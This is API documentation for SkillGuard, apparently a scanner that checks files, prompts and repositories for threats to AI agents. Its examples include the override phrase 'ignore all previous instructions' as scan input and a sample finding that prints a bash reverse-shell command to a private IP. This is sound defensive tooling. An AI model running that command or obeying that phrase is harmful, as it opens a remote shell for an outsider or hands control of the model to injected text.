# API Reference

## Scan Endpoints

### Scan File
Upload a file for threat analysis.

```bash
curl -X POST http://localhost:5000/api/scan/file \
  -F "file=@suspicious_skill.py"
```

**Supported formats:** `.py`, `.js`, `.ts`, `.sh`, `.yaml`, `.json`, `.md`, `.txt`, `.env`, `.zip`

### Scan Prompt
Analyze text for prompt injection patterns.

```bash
curl -X POST http://localhost:5000/api/scan/prompt \
  -H "Content-Type: application/json" \
  -d '{"content": "ignore all previous instructions"}'
```

### Scan URL
Scan a GitHub repo or HuggingFace model remotely.

```bash
curl -X POST http://localhost:5000/api/scan/url \
  -H "Content-Type: application/json" \
  -d '{"url": "https://github.com/user/repo"}'
```

### Health Check
```bash
curl http://localhost:5000/health
```

**Response:**
```json
{
  "status": "healthy",
  "version": "0.1.0",
  "patterns_loaded": 215
}
```

---

## Badge API

Get a dynamic SVG security badge for your repository.

```markdown
![SkillGuard](http://localhost:5000/badge?url=https://github.com/user/repo)
```

**Parameters:**
- `url` (required) — GitHub repo URL to scan and score

**Response:** SVG image with risk level indicator

**Example usage in README:**
```markdown
[![SkillGuard Security](http://localhost:5000/badge?url=https://github.com/user/repo)](http://localhost:5000)
```

---

## Response Format

All scan endpoints return a consistent JSON structure:

```json
{
  "target": "filename.py",
  "files_scanned": 1,
  "risk_score": 75,
  "risk_level": "HIGH",
  "critical_count": 3,
  "high_count": 2,
  "warning_count": 1,
  "findings_count": 6,
  "findings": [
    {
      "file": "filename.py",
      "line": 42,
      "column": 1,
      "severity": "critical",
      "category": "reverse_shell",
      "description": "Reverse shell pattern detected",
      "matched_text": "bash -i >& /dev/tcp",
      "line_content": "os.system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
    }
  ]
}
```

### Risk Levels

| Score | Level | Color |
|-------|-------|-------|
| 0-24 | LOW | Green |
| 25-49 | MEDIUM | Blue |
| 50-74 | HIGH | Amber |
| 75-100 | CRITICAL | Red |

---

## Rate Limiting

All scan endpoints are rate-limited to **5 requests per minute per IP**.

When exceeded, the API returns:
```json
{
  "error": "Rate limit exceeded. Max 5 scans per minute."
}
```
**HTTP Status:** `429 Too Many Requests`

---

## Admin Endpoints

### Admin Dashboard
Access the scan history dashboard at `/admin`.

### Export Scan Result
Export a specific scan result as JSON (requires admin auth).

```bash
curl http://localhost:5000/api/export/<scan_id> \
  -H "Authorization: Bearer <your-api-key>"
```

---

## Web UI Export

Scan results can be exported directly from the Web UI using the **"↓ Export JSON"** button. This downloads the full scan result as a timestamped JSON file.

---

## MCP Server

SkillGuard also provides an MCP server for Claude Code integration:

```bash
skillguard-mcp
```

**Tools:**
- `scan_file` — Scan a local file
- `scan_prompt` — Analyze prompt text
- `scan_directory` — Scan an entire directory

See [../README.md](../README.md) for MCP setup instructions.
